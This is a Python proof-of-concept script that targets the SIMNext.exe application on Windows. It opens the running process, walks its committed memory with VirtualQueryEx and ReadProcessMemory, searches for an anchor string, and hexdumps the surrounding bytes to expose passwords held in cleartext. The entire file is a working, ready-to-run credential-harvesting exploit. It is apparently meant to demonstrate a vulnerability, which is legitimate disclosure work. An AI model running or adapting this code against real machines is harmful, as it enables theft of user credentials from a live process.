# Dynamic PoC for Cleartext Password Discovery in SIMNext Memory
# Author: [Your Name / Handle]
# Date: 2025-06-24

import ctypes
import psutil
from ctypes.wintypes import DWORD, LPCVOID

# --- Windows API Definitions ---

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ('BaseAddress',       ctypes.c_size_t),
        ('AllocationBase',    ctypes.c_size_t),
        ('AllocationProtect', DWORD),
        ('PartitionId',       ctypes.c_ushort),
        ('RegionSize',        ctypes.c_size_t),
        ('State',             DWORD),
        ('Protect',           DWORD),
        ('Type',              DWORD),
    ]

MEM_COMMIT = 0x00001000
PAGE_NOACCESS = 0x01
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010
k32 = ctypes.windll.kernel32
k32.VirtualQueryEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(MEMORY_BASIC_INFORMATION), ctypes.c_size_t]
k32.VirtualQueryEx.restype = ctypes.c_size_t
k32.ReadProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
k32.ReadProcessMemory.restype = ctypes.c_bool

def hexdump(src, length=32, sep=''):
    """Generates a classic hexdump output of a byte string."""
    result = []
    for i in range(0, len(src), length):
        subSrc = src[i:i+length]
        hexa = ''
        for h in range(0,len(subSrc)):
            if h == length/2:
                hexa += ' '
            hexa += ' %02X' % subSrc[h]
        text = ''.join([chr(c) if 0x20 <= c < 0x7F else sep for c in subSrc])
        result.append(('%08X: ' % (i)) + hexa.ljust(length*3) + ' |' + text + '|')
    return '\n'.join(result)

def find_pid_by_name(process_name):
    """Finds a Process ID (PID) by its executable name."""
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == process_name:
            return proc.info['pid']
    return None

def scan_and_dump_memory(pid, anchor_bytes, dump_size=256):
    """Scans memory for an anchor and dumps the surrounding region."""
    found_regions = []
    hProcess = None
    try:
        permissions = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
        hProcess = k32.OpenProcess(permissions, False, pid)
        if not hProcess:
            print(f"Failed to get handle for PID {pid}. Error: {k32.GetLastError()}. Try as Admin.")
            return

        print(f"Starting memory scan for PID {pid}. This may take a moment...")
        base_addr = 0
        mbi = MEMORY_BASIC_INFORMATION()
        while k32.VirtualQueryEx(hProcess, base_addr, ctypes.byref(mbi), ctypes.sizeof(mbi)) > 0:
            next_addr = mbi.BaseAddress + mbi.RegionSize
            if (mbi.State == MEM_COMMIT and not (mbi.Protect & PAGE_NOACCESS)):
                try:
                    buffer = ctypes.create_string_buffer(mbi.RegionSize)
                    bytesRead = ctypes.c_size_t(0)
                    if k32.ReadProcessMemory(hProcess, mbi.BaseAddress, buffer, mbi.RegionSize, ctypes.byref(bytesRead)):
                        offset = buffer.raw.find(anchor_bytes)
                        if offset != -1:
                            anchor_address = mbi.BaseAddress + offset
                            print(f"\n--> Anchor found at address: 0x{anchor_address:X}")
                            
                            # Read the memory region around the anchor for dumping
                            dump_start_addr = max(mbi.BaseAddress, anchor_address - dump_size // 2)
                            read_size = min(dump_size, mbi.RegionSize - (dump_start_addr - mbi.BaseAddress))
                            dump_buffer = ctypes.create_string_buffer(read_size)
                            bytesReadDump = ctypes.c_size_t(0)
                            
                            if k32.ReadProcessMemory(hProcess, dump_start_addr, dump_buffer, read_size, ctypes.byref(bytesReadDump)):
                                print(f"--- Memory Dump around anchor (starting from 0x{dump_start_addr:X}) ---")
                                print(hexdump(dump_buffer.raw[:bytesReadDump.value]))
                                print("--- End of Dump ---")
                                found_regions.append(anchor_address)

                except (ctypes.ArgumentError, TypeError):
                    pass
            if next_addr == 0:
                break
            base_addr = next_addr
        return found_regions
    finally:
        if hProcess:
            k32.CloseHandle(hProcess)
            print("\nScan complete. Process handle closed.")

if __name__ == '__main__':
    # --- CONFIGURATION ---
    PROCESS_NAME = "SIMNext.exe"
    # The ANCHOR is a known value, like the username, used to find the memory region.
    ANCHOR_STRING = "MainIPConnected" 
    ENCODING = 'utf-16-le' 
    ANCHOR_BYTES = ANCHOR_STRING.encode(ENCODING)
    
    # --- END CONFIGURATION ---
    
    pid = find_pid_by_name(PROCESS_NAME)
    if pid:
        print(f"Process '{PROCESS_NAME}' found with PID: {pid}")
        print(f"Scanning for anchor string: '{ANCHOR_STRING}' (Bytes: {ANCHOR_BYTES})")
        results = scan_and_dump_memory(pid, ANCHOR_BYTES)
        if not results:
            print("Anchor not found. Check if the user is logged in and the anchor string/encoding is correct.")
    else:
        print(f"Process '{PROCESS_NAME}' not found.")
